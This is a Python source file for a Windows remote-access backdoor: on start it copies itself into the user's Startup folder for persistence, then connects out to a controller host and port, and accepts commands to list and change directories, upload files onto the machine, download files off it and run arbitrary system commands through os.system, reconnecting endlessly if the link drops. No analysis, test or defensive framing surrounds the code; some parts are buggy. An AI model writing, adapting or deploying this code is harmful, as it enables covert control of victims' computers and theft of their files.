import re
import sys
import socket
import os
from pathlib import Path


class socs:
    def __init__(self, host, port, name):
        super().__init__()
        #self.name = str(os.path.basename(__file__))

        try:
            file_check = Path(str(Path.home())+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\".format(name))
            if file_check.is_file():
                pass
            else:
                paths = str(Path.home())
                path_start = "{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(paths)
                self.opnr_copy(name, path_start)
        except Exception as error:
            pass

        while True:
            try:
                self.host = host
                self.port = port
                
                self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.soc.connect((self.host, self.port))
                break
            except Exception as error:
                pass
    

    def opnr_copy(self, filename, path):
        opnr_read = open(filename, "rb")
        data = opnr_read.read()
        opnr_read.close()

        opnr_write = open(path+"\\"+filename, "ab")
        opnr_write.write(data)
        opnr_write.close()

    
    def char_remove(self, char, remove):
        a = char.split(" ")
        strs = ""
        for x in a:
            if x == remove:
                continue
            strs += x
        return strs


    def socks(self):
        pattern_cd = r"cd"
        pattern_ls = r"ls"
        pattern_rcv_upload = r"upload"
        pattern_send_download = r"download"
        pattern_move = r"move"
        pattern_run = r"run"
        
        while True:
            try:
                self.data = self.soc.recv(1025).decode()
                
                if re.match(pattern_cd, self.data):
                    try:
                        os.chdir(self.char_remove(self.data, "cd").strip())
                        self.soc.send(bytes("Changed Directory to {0}".format(os.getcwd()), "utf-8"))
                    except FileNotFoundError:
                        self.soc.send("File Not Found Error".encode())
                        pass
                    except Exception as error:
                        self.soc.send(bytes(error, "utf-8"))
                        pass
                    
                elif re.match(pattern_ls, self.data):
                    output = os.listdir()
                    self.soc.send(bytes(str(output), "utf-8"))
                elif re.match(pattern_rcv_upload, self.data):
                    try:
                        name = self.char_remove(self.data, "upload")
                        data_bin = self.soc.recv(99999999)
                        with open(name, "ab") as opnr:
                            opnr.write(data_bin)
                        
                        opnr.close()
                        self.soc.send("uploaded {0}".format(name).encode())
                    except Exception as error:
                        self.soc.send(bytes(error, "utf-8"))
                    
                elif re.match(pattern_send_download, self.data):
                    try:
                        name = self.char_remove(self.data, "download")
                        opnr = open(name, "rb")
                        bin_data = opnr.read()
                        #self.soc.send(bytes(bin_data, "utf-8"))
                        self.soc.send(bin_data)
                        opnr.close()
                    except Exception as error:
                        self.soc.send("Error {0}".format(error).encode())
                elif re.match(pattern_move, self.data):
                    opnr_read = open(re.sub('*\ ', '',self.data))
                    
                    opnr = open(self.data.lstrip("move "), "ab")
                    opnr.write(opnr_read.read())
                    opnr.close()
                    opnr_read.close()
                elif re.search(pattern_run, self.data):
                    try:
                        command = self.char_remove(self.data, "run").strip()
                        output = os.system(command)
                        if output == 0:
                            self.soc.send(bytes("Executed program", "utf-8"))
                        else:
                            self.soc.send("Error {0}".format(output))
                    except Exception as error:
                        self.soc.send(bytes("Error: {0}".format(error), "utf-8"))
                else:
                    self.soc.send("Unknown Command".encode())

            except ConnectionAbortedError as error:
                while True:
                    try:
                        self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.soc.connect((self.host, self.port))
                        self.soc.send(error)
                        break
                    except Exception as error:
                        pass

            except ConnectionRefusedError as error:
                while True:
                    try:
                        self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.soc.connect((self.host, self.port))
                        self.soc.send(error)
                        break
                    except Exception:
                        pass

            except Exception as error:
                self.soc.send(bytes("ERROR {0}".format(error), "utf-8"))
                pass

